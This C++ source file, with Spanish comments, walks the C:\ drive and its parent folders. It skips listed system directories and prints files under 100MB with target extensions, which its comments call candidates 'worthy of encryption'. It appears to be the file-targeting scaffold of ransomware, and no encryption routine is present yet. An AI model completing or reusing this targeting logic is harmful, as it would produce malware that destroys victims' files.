#include <iostream>
#include <algorithm>
#include <vector>
#include <filesystem>
#include <thread> //hilos

/*Mis librerias*/
#include "sysinfo.h"

//debuging
#include <io.h>
#include <fcntl.h>


namespace fs = std::filesystem;


void tempFolder()
{

}

/**********************************************************************************

                                    CHECKERS


**********************************************************************************/
/**
 * @brief : Comprobar si el archivo tiene una extension deseada
 * @param path : Ruta del fichero
 * @return  : true or false
*/
bool checkExtension(const fs::path & path)
{

    bool exist = false;
    if (any_of(tiposFichero.begin(), tiposFichero.end(), [& path](const std::string& ext) {return ext == path.extension();}))
        exist=true;

    return exist;
}

/**
 * @brief : Comprobar si el directorio actual es un directorio a evitar.
 * @param path : Directorio actual
 * @return : true or false
*/
bool checkDirectorio(const fs::path& path)
{
    bool noExist = true;
    if (any_of(directorioProhibido.begin(), directorioProhibido.end(), [&path](const std::string& ext) {return ext == path.filename(); }))
    {
        std::wstring cadena = path.wstring() + L"DIRECTORIO PROHIBIDO LOCALIZADO" + L'\n';
        std::wcout << cadena;
        noExist = false;
    }
        

    return noExist;
}

/**
 * @brief : Comprobar si es un archivo digno de encriptación
 * @param pathFile : Ruta del archivo a checkear
 * @return : true or false
*/
bool checkFile(fs::directory_entry const& pathFile)
{
    const int max_size = 100000000; //100MB
    bool candidato = false;

    if (pathFile.is_regular_file() &&          //Es un archivo
        pathFile.file_size() < max_size &&     //Pesa menos de 100MB
        checkExtension(pathFile.path())        //Funcion checkExtension , comprobar la extension del archivo
                                               //Implementar permisos en un futuro
        )
        candidato = true;

    return candidato;
}


/**********************************************************************************

                                    RUNNERS


**********************************************************************************/
/**
 * @brief : Recorrer la ruta actual y todas las inferiores
 * @param path : Ruta actual
*/
void recorrerInfierno(const fs::path & path, int color)
{
    
    /****************************************/
    std::wstring coloret = L"";
    if (color)
        coloret = L"\033[1;32m";
    else 
        coloret = L"\033[1;31m";
    /****************************************/
    
    //listar este punto
    for (fs::directory_entry const& pathFile : fs::directory_iterator(path, fs::directory_options::skip_permission_denied))
    { 
       
        if (pathFile.is_directory() && checkDirectorio(pathFile.path())) //Es un directorio y no es un directorio prohibido, pintamos magenta
        {
            /****************************************/
            std::wstring micadena = coloret + pathFile.path().wstring() + L"\033[0m\n";  //Cadena para que no se solape la salida en multihilo
            std::wcout << micadena;
            /****************************************/
            recorrerInfierno(pathFile.path(), color);

        }
        else
        {
            if (checkFile(pathFile))                                    //Es un archivo valido -- Mandamos a encriptar color cyan , mismo nivel
            {
                
                /****************************************/
                std::wstring pintar = coloret + pathFile.path().wstring() + L"\033[0m\n";
                std::wcout << pintar;
                /****************************************/

            }
        }
       // std::cout << "this is not the end"  << '\n';

    }
}      



/**
 * @brief : Recorre la ruta superior recursivamente, (Si existe) y analizar todas los archivos presentes en esta.
 * @param path : Ruta actual
*/
void recorrerCielo(const fs::path& path)
{
    const fs::path parentPath = path.parent_path();

    if (path.has_relative_path())                                                                       //Si existe un directorio superior
    {

        for (fs::directory_entry const& pathFile : fs::directory_iterator(parentPath, fs::directory_options::skip_permission_denied))
        {
            if (pathFile.is_directory() && pathFile.path() != path && checkDirectorio(pathFile.path())) //Es un directorio y no es desde donde viene y no es un directorio prohibido, mandamos a recorrer el infierno
            {
                /****************************************/
                //std::cout << "\033[1;31m" << pathFile.path() << "\033[0m\n";                            //Imprimimos rojo los directorios encontrados
               // recorrerInfierno(pathFile.path());
                /****************************************/
            }
            else
            {
                if (checkFile(pathFile))                                                                //Es un archivo valido -- Mandamos a encriptar color verde , mismo nivel
                {
                    /****************************************/
                    std::cout << "\033[1;32m" << pathFile.path() << "\033[0m\n";
                    /****************************************/
                }
            }
            if (pathFile.path() == path)
            {
                /****************************************/
                std::cout << pathFile.path() << "    HIJO LOCALIZADO " << std::endl;
                /****************************************/
            }
        }

        recorrerCielo(parentPath); //volvemos a subir 

    }
}


/**********************************************************************************

                                    MAIN


**********************************************************************************/
int main()
{

    /*
    std::string osName = getOsName();
 
    //current path block
    fs::path current = fs::current_path();
    std::string currentPath = current.string();
    std::cout << currentPath << std::endl;

    std::string currentLetter = currentPath.substr(0, 3);
    std::cout << currentLetter << std::endl;
    
    */
    
    // Debugeamos ponemos le cout en U16 
    _setmode(_fileno(stdout), _O_U16TEXT);

    const fs::path currentDir = fs::current_path();
    const std::string userDir = getUserDir();
    //const std::vector<std::string> listDisk = getLogicalDrives();
    
    
    //Probando hilos 
    fs::path pathC = "C:\\";
    //fs::path pathD = "D:\\";
    //fs::path pathD = "D:\\Disco duro extraible copia\\UNIVERSIDAD\\universidad 1 año\\-  DESCARGAS  -\\";


    
    recorrerInfierno(pathC, 0);
    //std::thread c(recorrerInfierno, std::ref(pathC),0);   // t starts running
    //std::thread d(recorrerInfierno, std::ref(pathD),1);   // t starts running

   // c.join();
    //d.join();



    //fs::path path = "D:\\";
    //recorrerInfierno(path,1);
    //recorrerCielo(path);

    //system("pause");
    return 0;


}




